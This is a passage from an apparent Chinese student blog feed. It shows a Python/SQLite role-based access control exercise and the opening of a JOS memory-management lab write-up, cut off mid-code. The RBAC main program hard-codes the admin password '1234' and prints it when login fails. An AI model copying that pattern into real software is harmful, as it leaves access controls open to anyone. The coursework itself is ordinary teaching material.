class="hljs-string">"用户可以选择的角色:1.第一类员工2.第一类员工的经理3.第二类员工4.第二类员工经理5.老板"</span>)        user_type = int(input(<span class="hljs-string">"请输入用户对应的角色id:"</span>))        <span class="hljs-keyword">if</span> user_type == <span class="hljs-number">1</span>:            user_role = <span class="hljs-string">"第一类员工"</span>            role_id = <span class="hljs-number">101</span>            <span class="hljs-keyword">return</span> user_role,role_id        <span class="hljs-keyword">elif</span> user_type == <span class="hljs-number">2</span>:            user_role = <span class="hljs-string">"第一类员工的经理"</span>            role_id = <span class="hljs-number">100</span>            <span class="hljs-keyword">return</span> user_role,role_id        <span class="hljs-keyword">elif</span> user_type == <span class="hljs-number">3</span>:            user_role = <span class="hljs-string">"第二类员工"</span>            role_id = <span class="hljs-number">201</span>            <span class="hljs-keyword">return</span> user_role,role_id        <span class="hljs-keyword">elif</span> user_type == <span class="hljs-number">4</span>:            user_role = <span class="hljs-string">"第二类员工的经理"</span>            role_id = <span class="hljs-number">200</span>            <span class="hljs-keyword">return</span> user_role,role_id        <span class="hljs-keyword">elif</span> user_type == <span class="hljs-number">5</span>:            print(<span class="hljs-string">"无权限添加老板"</span>)            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>,<span class="hljs-literal">None</span>        <span class="hljs-keyword">else</span>:            print(<span class="hljs-string">"无法识别用户对应的角色id,请按照上面输入用户角色对应的数字"</span>)            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>,<span class="hljs-literal">None</span>        <span class="hljs-comment">#该方法用来展示输入要添加的用户的用户名以及对应你id</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">user_info</span><span class="hljs-params">(self)</span>:</span>        user_name=input(<span class="hljs-string">'请输入用户名：'</span>)        user_id=int(input(<span class="hljs-string">'请输入用户id:'</span> ))        <span class="hljs-keyword">return</span> user_name,user_id    <span class="hljs-comment">#该方法用来实现添加对应的用户</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_user</span><span class="hljs-params">(self)</span>:</span>        (user_role,role_id)=self.add_user_role()        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user_role <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> role_id :            print(<span class="hljs-string">"操作失败！"</span>)            <span class="hljs-keyword">return</span>        (user_name,user_id)=self.user_info()        con=sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur=con.cursor()        con.row_factory=sqlite3.Row        <span class="hljs-keyword">try</span>:            <span class="hljs-comment">#首先需要判断输入的用户名是否已经存在</span>            sql=<span class="hljs-string">'select *from user'</span>            cur.execute(sql)            <span class="hljs-comment">#判断输入的用户名是否在用户表当中</span>            exist = <span class="hljs-literal">False</span>            <span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> cur:                <span class="hljs-keyword">if</span> user[<span class="hljs-number">1</span>] == user_name:                    exist = <span class="hljs-literal">True</span>                    <span class="hljs-comment">#此时，用户表中存在对应的用户</span>                    true_user_id=user[<span class="hljs-number">2</span>]                    true_role_id=<span class="hljs-literal">None</span>                    <span class="hljs-comment">#之后，从用户角色关联表当中查到对应的角色</span>                    sql1=<span class="hljs-string">'select *from user_role'</span>                    cur.execute(sql1)                    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:                        <span class="hljs-keyword">if</span> row[<span class="hljs-number">1</span>] == true_user_id:                            true_role_id = row[<span class="hljs-number">2</span>]                            <span class="hljs-comment">#此时，已经找到了在用户角色关联表当中的角色id</span>                    <span class="hljs-comment">#之后需要进行角色互斥，在这里面所有角色都为互斥，比如不可能既是老板又是员工，设定一个人只能拥有一个角色</span>                    <span class="hljs-keyword">if</span> role_id == true_role_id:                        print(<span class="hljs-string">"该用户已经存在这种角色"</span>)            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> exist:                <span class="hljs-comment">#如果不在用户表中，需要把新的用户以及用户id添加到用户表当中</span>                <span class="hljs-keyword">try</span>:                    sql = <span class="hljs-string">'insert into user(user_name,user_id) values(?,?)'</span>                    cur.execute(sql,(user_name,user_id))                    con.commit()                    print(<span class="hljs-string">"新增用户成功"</span>)                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                    print(e)                    con.rollback()                    print(<span class="hljs-string">"新增用户失败"</span>)                <span class="hljs-comment">#之后，我们需要根据add_user_role()得知想要添加的用户对应的角色id,加到用户角色关联表当中</span>                <span class="hljs-keyword">try</span>:                    sql1 = <span class="hljs-string">'insert into user_role(user_id,role_id) values(?,?)'</span>                    cur.execute(sql1,(user_id,role_id))                    con.commit()                    print(<span class="hljs-string">"新增用户角色关联条目成功"</span>)                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                    print(e)                    con.rollback()                    print(<span class="hljs-string">"新增用户角色关联条目失败"</span>)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            print(e)            print(<span class="hljs-string">"add_user()失败，请进行检查"</span>)        <span class="hljs-keyword">finally</span>:            cur.close()            con.close()        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">user_name_show</span><span class="hljs-params">(self)</span>:</span>        con = sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur=con.cursor()        con.row_factory=sqlite3.Row        sql=<span class="hljs-string">'select *from user'</span>        <span class="hljs-keyword">try</span>:            cur.execute(sql)            print(<span class="hljs-string">"显示用户信息"</span>)             user_list=[]            <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:                user_list.append(row[<span class="hljs-number">1</span>])            print(user_list)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            print(e)            con.rollback()            print(<span class="hljs-string">"显示用户信息失败"</span>)        <span class="hljs-keyword">finally</span>:            cur.close()            con.close()</code></pre></li><li><p><strong>对权限进行管理的类rolemanager（）</strong></p><p>  包含的方法以及各自作用：</p><p>  首先明确在这个类里面，我们首先要实现把<strong>具体例子的角色表以及对应的角色权限关联表初始化</strong>，其次要完成的是<strong>基于角色的权限的修改</strong>，<strong>在这里我是进行来一个限制，不能让一些角色通过提升或者删除权限来变成了另一个角色</strong>，最后的话是<strong>用来展示当前角色表信息的函数</strong></p><ul><li>对于角色表以及对应的角色权限关联表初始化的函数</li></ul></li></ul><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_role_table</span><span class="hljs-params">(self)</span>:</span>        <span class="hljs-comment">#set the connection to the db file</span>        con = sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur = con.cursor()        <span class="hljs-comment">#creat the table</span>        sql = <span class="hljs-string">'insert into role(role_name, role_id) values(?,?)'</span>        <span class="hljs-comment">#execute</span>        <span class="hljs-keyword">try</span>:            cur.executemany(sql,[(<span class="hljs-string">"第一类员工的经理"</span>,<span class="hljs-number">100</span>),(<span class="hljs-string">"第一类员工"</span>,<span class="hljs-number">101</span>),(<span class="hljs-string">"第二类员工的经理"</span>,<span class="hljs-number">200</span>),(<span class="hljs-string">"第二类员工"</span>,<span class="hljs-number">201</span>),(<span class="hljs-string">"Boss"</span>,<span class="hljs-number">404</span>)])            <span class="hljs-comment">#commitment</span>            con.commit()            print(<span class="hljs-string">"设置角色成功"</span>)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            print(e)            con.rollback()            print(<span class="hljs-string">"设置角色失败"</span>)        <span class="hljs-keyword">finally</span>:            <span class="hljs-comment">#close the connect</span>            cur.close()            con.close()            <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_role_permission_table</span><span class="hljs-params">(self)</span>:</span><span class="hljs-comment">#设置对应的角色权限关联表</span>        con = sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur = con.cursor()        sql=<span class="hljs-string">'insert into role_permission(role_id,permission_id) values(?,?)'</span>        <span class="hljs-keyword">try</span>:            cur.executemany(sql,[(<span class="hljs-number">101</span>,<span class="hljs-number">1002</span>),(<span class="hljs-number">101</span>,<span class="hljs-number">1003</span>),(<span class="hljs-number">100</span>,<span class="hljs-number">1002</span>),(<span class="hljs-number">100</span>,<span class="hljs-number">1003</span>),(<span class="hljs-number">100</span>,<span class="hljs-number">1005</span>),(<span class="hljs-number">201</span>,<span class="hljs-number">1001</span>),(<span class="hljs-number">201</span>,<span class="hljs-number">1002</span>),(<span class="hljs-number">201</span>,<span class="hljs-number">1004</span>),(<span class="hljs-number">200</span>,<span class="hljs-number">1001</span>),(<span class="hljs-number">200</span>,<span class="hljs-number">1002</span>),(<span class="hljs-number">200</span>,<span class="hljs-number">1004</span>),(<span class="hljs-number">200</span>,<span class="hljs-number">1005</span>),(<span class="hljs-number">404</span>,<span class="hljs-number">1001</span>),(<span class="hljs-number">404</span>,<span class="hljs-number">1002</span>),(<span class="hljs-number">404</span>,<span class="hljs-number">1003</span>),(<span class="hljs-number">404</span>,<span class="hljs-number">1004</span>),(<span class="hljs-number">404</span>,<span class="hljs-number">1005</span>)])            con.commit()            print(<span class="hljs-string">"角色权限关联表设置成功"</span>)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            print(e)            con.rollback()            print(<span class="hljs-string">"角色权限关联表设置失败"</span>)        <span class="hljs-keyword">finally</span>:            cur.close()            con.close()</code></pre><ul><li>之后是对于权限的修改的函数，增加权限的时候要先判断该角色是否已经有了这个权限，二在删除的时候也应该先看是否具有这个权限，同时不能因为权限改变而改变身份，比如一类员工不能增加权限5，否则会变成第一类员工的经理</li></ul><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modify_permission</span><span class="hljs-params">(self)</span>:</span>        <span class="hljs-comment">#set the connection to the db file</span>        con = sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur = con.cursor()        <span class="hljs-comment">#we need to modify the seperate data row, achieve this by using row</span>        print(<span class="hljs-string">"here is the id and the name:第一类员工:101   第一类员工的经理:100    第二类员工:201    第二类员工的经理:200    Boss:404"</span>)        con.row_factory = sqlite3.Row        print(<span class="hljs-string">"do not modify the Boss's permission!!!"</span>)        role_id = int(input(<span class="hljs-string">"请输入您要修改权限的角色对应的角色id:"</span>))        addel = int(input(<span class="hljs-string">"对该角色增加权限请输入1,删除权限请输入2:"</span>))        print(<span class="hljs-string">"所有可以增加或删除的权限:1001:新建  1002:读取  1003:执行  1004:更改  1005:删除"</span>)                <span class="hljs-keyword">if</span> addel == <span class="hljs-number">1</span>:<span class="hljs-comment">#when it comes to add permission</span>            permission = int(input(<span class="hljs-string">"请输入要增加权限的对应数字:"</span>))            <span class="hljs-comment">#then we need to check weather the permission is already exist</span>            exist = <span class="hljs-literal">False</span>            <span class="hljs-comment">#we need to check the permission that the role already have</span>            permissionlist = []            <span class="hljs-comment">#we need to check the role_permission table</span>            sql = <span class="hljs-string">'select *from role_permission'</span>            cur.execute(sql)            <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:                <span class="hljs-keyword">if</span> row[<span class="hljs-number">1</span>] == role_id:                    permissionlist.append(row[<span class="hljs-number">2</span>])                    <span class="hljs-keyword">if</span> row[<span class="hljs-number">2</span>] == permission:                        exist = <span class="hljs-literal">True</span>                        print(<span class="hljs-string">"该角色已经有了输入的permission id对应的权限,不需要进行增加"</span>)            <span class="hljs-comment">#if the permission is not exist, add the permission to the role</span>            <span class="hljs-keyword">if</span> exist == <span class="hljs-literal">False</span>:                <span class="hljs-comment">#之后我们需要实现对于权限的控制，不能是因为提升权限而变成了另一个角色</span>                result = <span class="hljs-literal">False</span>                <span class="hljs-keyword">if</span> role_id == <span class="hljs-number">101</span>:                    <span class="hljs-keyword">if</span> permission == <span class="hljs-number">1005</span>:                        result = <span class="hljs-literal">True</span>                        print(<span class="hljs-string">"增加权限失败，因为第一类员工不能增加权限5，否则会变成第一类员工的经理"</span>)                        cur.close()                        con.close()                <span class="hljs-keyword">if</span> role_id == <span class="hljs-number">201</span>:                    <span class="hljs-keyword">if</span> permission == <span class="hljs-number">1005</span>:                        result = <span class="hljs-literal">True</span>                        print(<span class="hljs-string">"增加权限失败，因为第二类员工不能增加权限5，否则会变成第二类员工的经理"</span>)                        cur.close()                        con.close()                <span class="hljs-keyword">if</span> role_id == <span class="hljs-number">200</span>:                    <span class="hljs-keyword">if</span> permission == <span class="hljs-number">1003</span>:                        result = <span class="hljs-literal">True</span>                        print(<span class="hljs-string">"增加权限失败，因为第二类员工的经理不能增加权限3，否则会变成Boss"</span>)                        cur.close()                        con.close()                <span class="hljs-keyword">if</span> role_id == <span class="hljs-number">404</span>:                    result = <span class="hljs-literal">True</span>                    print(<span class="hljs-string">"Boss拥有所有权限，无法提升"</span>)                    cur.close()                    con.close()                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:                    <span class="hljs-keyword">try</span>:                        sql1 = <span class="hljs-string">'insert into role_permission(role_id,permission_id) values(?,?)'</span>                        cur.execute(sql1,(role_id,permission))                        con.commit()                        print(<span class="hljs-string">"增加权限成功"</span>)                    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                        print(e)                        con.rollback()                        print(<span class="hljs-string">"增加权限失败，请进行检查"</span>)                    <span class="hljs-keyword">finally</span>:                        cur.close()                        con.close()        <span class="hljs-keyword">if</span> addel == <span class="hljs-number">2</span>:<span class="hljs-comment">#当要删除权限的时候</span>            permission = int(input(<span class="hljs-string">"请输入要删除权限的对应数字:"</span>))            exist = <span class="hljs-literal">False</span>            sql = <span class="hljs-string">'select *from role_permission'</span>            permissionlist = []            cur.execute(sql)            <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:                <span class="hljs-keyword">if</span> row[<span class="hljs-number">1</span>]==role_id:                    permissionlist.append(row[<span class="hljs-number">2</span>])                    <span class="hljs-keyword">if</span> row[<span class="hljs-number">2</span>] == permission:                        exist = <span class="hljs-literal">True</span>                        print(<span class="hljs-string">"检查通过，该角色拥有对应的权限，可以进行权限的删除"</span>)                        result = <span class="hljs-literal">False</span>                        <span class="hljs-keyword">if</span> role_id == <span class="hljs-number">100</span>:                            <span class="hljs-keyword">if</span> permission == <span class="hljs-number">1005</span>:                                result = <span class="hljs-literal">True</span>                                print(<span class="hljs-string">"删除权限失败，因为第一类员工的经理不能删除权限5，否则会变成第一类员工"</span>)                                cur.close()                                con.close()                        <span class="hljs-keyword">if</span> role_id == <span class="hljs-number">200</span>:                            <span class="hljs-keyword">if</span> permission == <span class="hljs-number">1005</span>:                                result = <span class="hljs-literal">True</span>                                print(<span class="hljs-string">"删除权限失败，因为第二类员工的经理不能删除权限5，否则会变成第二类员工"</span>)                                cur.close()                                con.close()                        <span class="hljs-keyword">if</span> role_id == <span class="hljs-number">404</span>:                            print(<span class="hljs-string">"Boss拥有所有权限，不能删除Boss权限"</span>)                            cur.close()                            con.close()                        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:                            <span class="hljs-keyword">try</span>:                                sql1=<span class="hljs-string">'delete from role_permission where pno=?'</span>                                cur.execute(sql1,(row[<span class="hljs-number">0</span>],))                                con.commit()                                print(<span class="hljs-string">"删除权限成功"</span>)                            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:                                print(e)                                con.rollback()                                print(<span class="hljs-string">"删除权限失败"</span>)                            <span class="hljs-keyword">finally</span>:                                cur.close()                                con.close()                                <span class="hljs-keyword">break</span>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> exist:                print(<span class="hljs-string">"没有此权限"</span>)                cur.close()                  con.close()</code></pre><p>至于用来展示的role_show（）函数，和前面类的展示函数并没有什么区别</p><ul><li><p>对于权限管理的类permissionmanager（）</p><p>  在这里重要的也就是对于权限表的管理，其他的调整关联表的函数上面已经实现</p></li></ul><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">permissionmanager</span><span class="hljs-params">()</span>:</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self)</span>:</span>        super().__init__()        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permission_show</span><span class="hljs-params">(self)</span>:</span>        con=sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur=con.cursor()        sql=<span class="hljs-string">'select *from permission'</span>        print(<span class="hljs-string">'权限及权限id:'</span>)        <span class="hljs-keyword">try</span>:            cur.execute(sql)            <span class="hljs-keyword">for</span> permission <span class="hljs-keyword">in</span> cur:                print(permission)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            print(e)            con.rollback()            print(<span class="hljs-string">"显示权限信息失败"</span>)        <span class="hljs-keyword">finally</span>:            cur.close()            con.close()    <span class="hljs-comment">#设置对应的表</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set_permission_table</span><span class="hljs-params">(self)</span>:</span>        con=sqlite3.connect(<span class="hljs-string">"d:/Information System Security/RBAC/datatable.db"</span>)        cur=con.cursor()        sql=<span class="hljs-string">'insert into permission(permission_name,permission_id) values(?,?)'</span>        <span class="hljs-keyword">try</span>:            cur.executemany(sql,[(<span class="hljs-string">'新建'</span>,<span class="hljs-number">1001</span>),(<span class="hljs-string">'读取'</span>,<span class="hljs-number">1002</span>),(<span class="hljs-string">'执行'</span>,<span class="hljs-number">1003</span>),(<span class="hljs-string">'更改'</span>,<span class="hljs-number">1004</span>),(<span class="hljs-string">'删除'</span>,<span class="hljs-number">1005</span>)])            con.commit()            print(<span class="hljs-string">'权限表设置成功'</span>)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            print(e)            con.rollback()            print(<span class="hljs-string">'权限表设置失败'</span>)        <span class="hljs-keyword">finally</span>:            cur.close()            con.close()</code></pre><p>最后是调用并且实例化上面类的主函数/文件main.py</p><p>在这里面主要是mian函数来调用其他类里面的方法，还有就是通过user_list（）以及check（）方法来访问用户表以及查询用户有没有对应的一些权限，以及最开始建立5个表的格式</p><p>在这里只贴出部分代码，具体的可以看py文件</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">user_list</span><span class="hljs-params">()</span>:</span>    con = sqlite3.connect(<span class="hljs-string">"datatable.db"</span>)    cur = con.cursor()    con.row_factory=sqlite3.Row    sql=<span class="hljs-string">'select *from user'</span>    <span class="hljs-comment">#进行查找</span>    <span class="hljs-keyword">try</span>:        cur.execute(sql)        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:            print(row[<span class="hljs-number">0</span>],row[<span class="hljs-number">1</span>],row[<span class="hljs-number">2</span>])    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        print(e)        con.rollback()        print(<span class="hljs-string">'查询用户失败'</span>)    <span class="hljs-keyword">finally</span>:        cur.close()        con.close()        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span><span class="hljs-params">(username, permission)</span>:</span>    user_id = <span class="hljs-literal">None</span>    permission_id = <span class="hljs-literal">None</span>    role_id = <span class="hljs-literal">None</span>    permission_list = []    result = <span class="hljs-literal">False</span> <span class="hljs-comment">#判断是否存在</span>    con=sqlite3.connect(<span class="hljs-string">"datatable.db"</span>)    cur=con.cursor()    con.row_factory=sqlite3.Row    <span class="hljs-comment">#首先先查找对应的user_id</span>    <span class="hljs-keyword">try</span>:        sql=<span class="hljs-string">'select *from user'</span>        cur.execute(sql)        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:            <span class="hljs-keyword">if</span> username == row[<span class="hljs-number">1</span>]:                <span class="hljs-comment">#找到对应的user_id</span>                result = <span class="hljs-literal">True</span>                user_id = row[<span class="hljs-number">2</span>]        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:            print(<span class="hljs-string">"没有查到该username对应的user_id,请检查后再进行查询"</span>)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        print(e)        con.rollback()        print(<span class="hljs-string">'check():user_id查询失败,请检查code'</span>)            <span class="hljs-comment">#之后来查询对应的role_id</span>    <span class="hljs-keyword">try</span>:        sql=<span class="hljs-string">'select *from user_role'</span>        cur.execute(sql)        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:            <span class="hljs-keyword">if</span> user_id == row[<span class="hljs-number">1</span>]:                role_id = row[<span class="hljs-number">2</span>]    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        print(e)        con.rollback()        print(<span class="hljs-string">"check():role_id查询失败,请检查code"</span>)        <span class="hljs-comment">#之后查找所拥有的权限</span>    <span class="hljs-keyword">try</span>:        sql=<span class="hljs-string">'select *from role_permission'</span>        cur.execute(sql)        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:            <span class="hljs-keyword">if</span> role_id == row[<span class="hljs-number">1</span>]:                permission_list.append(row[<span class="hljs-number">2</span>])        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> permission_list:            print(<span class="hljs-string">'username对应的权限查询失败'</span>)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        print(e)        con.rollback()        print(<span class="hljs-string">"check():role_permission查询失败,请检查code"</span>)    <span class="hljs-comment">#最后查询对应的权限的id</span>    <span class="hljs-keyword">try</span>:        sql=<span class="hljs-string">'select *from permission'</span>        cur.execute(sql)        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:            <span class="hljs-keyword">if</span> permission == row[<span class="hljs-number">1</span>]:                permission_id = row[<span class="hljs-number">2</span>]        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> permission_id:            print(<span class="hljs-string">"permission对应的permission_id查询失败"</span>)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        print(e)        con.rollback()        print(<span class="hljs-string">"check():role_id查询失败,请检查code"</span>)    <span class="hljs-comment">#看输入的权限与查询出来的是否对应</span>    <span class="hljs-keyword">try</span>:        result2 = <span class="hljs-literal">False</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> permission_list:            <span class="hljs-keyword">if</span> i == permission_id:                result2 = <span class="hljs-literal">True</span>                print(<span class="hljs-string">"有此权限"</span>)        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result2:            print(<span class="hljs-string">"没有此权限"</span>)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        print(e)        con.rollback()        print(<span class="hljs-string">"check():权限不匹配，请检查code"</span>)    <span class="hljs-keyword">finally</span>:        cur.close()        con.close()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:    creat_table()    user_manage = usermanager()    role_manage = rolemanager()    permission_manage = permissionmanager()    user_manage.set_user_table()    role_manage.set_role_table()    permission_manage.set_permission_table()    user_manage.set_user_role_table()    role_manage.set_role_permission_table()    user_list()    user_manage.user_name_show()    role_manage.role_show()    permission_manage.permission_show()    permit = int(input(<span class="hljs-string">"#####请输入你的身份:1.非管理员 2.管理员:#####"</span>))    <span class="hljs-keyword">if</span> permit == <span class="hljs-number">2</span>:        password = input(<span class="hljs-string">"###请输入管理员账户密码:###"</span>)        <span class="hljs-keyword">if</span> password == <span class="hljs-string">'1234'</span>:            print(<span class="hljs-string">"1:显示当前信息   2:查询用户对应权限  3:添加用户  4:角色权限修改  5:退出"</span>)            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:                option = int(input(<span class="hljs-string">"请输入要进行的操作对应的数字"</span>))                <span class="hljs-keyword">if</span> option == <span class="hljs-number">1</span>:                    user_manage.user_name_show()                    role_manage.role_show()                    permission_manage.permission_show()                <span class="hljs-keyword">elif</span> option == <span class="hljs-number">2</span>:                    username = input(<span class="hljs-string">"请输入要查询的用户名:"</span>)                    user_permission = input(<span class="hljs-string">"请输入要查询该用户的权限(新建/读取/执行/更改/删除):"</span>)                    check(username,user_permission)                <span class="hljs-keyword">elif</span> option == <span class="hljs-number">3</span>:                    user_manage.add_user()                <span class="hljs-keyword">elif</span> option == <span class="hljs-number">4</span>:                    role_manage.modify_permission()                <span class="hljs-keyword">elif</span> option == <span class="hljs-number">5</span>:                    <span class="hljs-keyword">break</span>                <span class="hljs-keyword">else</span>:                    print(<span class="hljs-string">"输入指令错误，请按照上面显示内容输入"</span>)        <span class="hljs-keyword">else</span>:            print(<span class="hljs-string">"密码错误,在运行中为方便使用,密码为1234"</span>)        <span class="hljs-keyword">if</span> permit == <span class="hljs-number">1</span>:        print(<span class="hljs-string">'1:展示当前信息  2:查询用户权限  3:退出'</span>)        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:            option = int(input(<span class="hljs-string">"请输入要进行的操作对应的数字"</span>))            <span class="hljs-keyword">if</span> option == <span class="hljs-number">1</span>:                user_manage.user_name_show()                role_manage.role_show()                permission_manage.permission_show()            <span class="hljs-keyword">elif</span> option == <span class="hljs-number">2</span>:                username = input(<span class="hljs-string">"请输入要查询的用户名:"</span>)                user_permission = input(<span class="hljs-string">"请输入要查询该用户的权限(新建/读取/执行/更改/删除):"</span>)                check(username,user_permission)            <span class="hljs-keyword">elif</span> option == <span class="hljs-number">3</span>:                <span class="hljs-keyword">break</span>            <span class="hljs-keyword">else</span>:                print(<span class="hljs-string">"输入指令错误，请按照上面显示内容输入"</span>)    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">"输入指令错误，请按照上面显示内容输入"</span>)</code></pre><h3 id="成果演示"><a href="#成果演示" class="headerlink" title="成果演示"></a>成果演示</h3><ol><li><p>运行对应的mian.py文件，可以看到如下内容</p><p> <img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/4-1.PNG" srcset="/img/loading.gif" alt="4-1"></p></li><li><p>当为非管理员的时候，输入1，可以看到之后的可进行的操作，部分演示，在这里通过查询对应员工是否有权限可以来作为访问和访问拒绝的标志，有此权限说明对应用户可以进行访问，没有此权限则访问拒绝</p><p> <img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/4-2.PNG" srcset="/img/loading.gif" alt="4-2"></p></li><li><p>之后当为管理员的时候，以添加用户为例子来看对应的运行结果</p><p> <img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/4-3.PNG" srcset="/img/loading.gif" alt="4-3"></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Information System Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>oslab-2 Memory Management</title>
    <link href="/2020/11/21/oslab-2-Memory-Management/"/>
    <url>/2020/11/21/oslab-2-Memory-Management/</url>
    
    <content type="html"><![CDATA[<h1 id="lab-4：内存管理"><a href="#lab-4：内存管理" class="headerlink" title="lab 4：内存管理"></a>lab 4：内存管理</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>在本实验中，我们将编写操作系统的内存管理代码。 内存管理有两个组成部分。</p><p>第一个部分是内核的<strong>物理内存分配器</strong>，以致于内核可以分配和释放内存。 分配器将以4096字节为操作单位，称为一个页面。 我们的任务是维护一个数据结构，去记录哪些物理页面是空闲的，哪些是已分配的，以及共享每个已分配页面的进程数。 我们还要编写例程来分配和释放内存页面。</p><p>内存管理的第二个组件是<strong>虚拟内存</strong>，它将内核和用户软件使用的虚拟地址映射到物理内存中的地址。 当指令使用内存时，x86硬件的<code>内存管理单元（MMU）</code>执行映射，查询一组页表。 我们根据任务提供的规范修改JOS以设置MMU的页面表。</p><h2 id="Part-Ⅰ：Physical-Page-Management"><a href="#Part-Ⅰ：Physical-Page-Management" class="headerlink" title="Part Ⅰ：Physical Page Management"></a>Part Ⅰ：Physical Page Management</h2><p><code>物理内存页管理</code></p><p>操作系统必须跟踪物理RAM（Random Access Memory,一般是主存）的哪些部分是空闲的，哪些部分正在使用，而这部分的实现是通过物理页面分配器来进行的，它通过struct PageInfo的链表来查询，每个PageInfo对应着一个物理内存页面</p><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h3><h4 id="boot-alloc-函数"><a href="#boot-alloc-函数" class="headerlink" title="boot_alloc()函数"></a>boot_alloc()函数</h4><p>该函数维护一个static的指针nextfree，初始值是end，end是定义在/kern/kernel.ld中定义的符号，位于bss段的末尾。也就是说从内核的末尾开始分配物理内存。需要添加如下代码</p><pre><code class="hljs c"><span class="hljs-comment">// Allocate a chunk large enough to hold 'n' bytes, then update</span><span class="hljs-comment">// nextfree.  Make sure nextfree is kept aligned</span><span class="hljs-comment">// to a multiple of PGSIZE.</span><span class="hljs-comment">//</span><span class="hljs-comment">// LAB 2: Your code here.</span>result = nextfree;nextfree = ROUNDUP((<span class="hljs-keyword">char</span> *)result + n, PGSIZE);cprintf(<span class="hljs-string">"boot memory at %x, next memory allocate at %x\n"</span>,result, nextfree);<span class="hljs-keyword">return</span> result;</code></pre><p>之后来看mem_init()函数</p><h4 id="mem-init-函数"><a href="#mem-init-函数" class="headerlink" title="mem_init()函数"></a>mem_init()函数</h4><p><img src="/2020/11/21/oslab-2-Memory-Management/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><p>可以看到是将boot_alloc()返回的result的值（当前的页）给了kern_pgdir，kern_pgdir保存的是内核页目录的物理地址</p><p>之后根据注释完成代码</p><pre><code class="hljs c"><span class="hljs-comment">// Allocate an array of npages 'struct PageInfo's and store it in 'pages'.</span><span class="hljs-comment">// The kernel uses this array to keep track of physical pages: for</span><span class="hljs-comment">// each physical page, there is a corresponding struct PageInfo in this</span><span 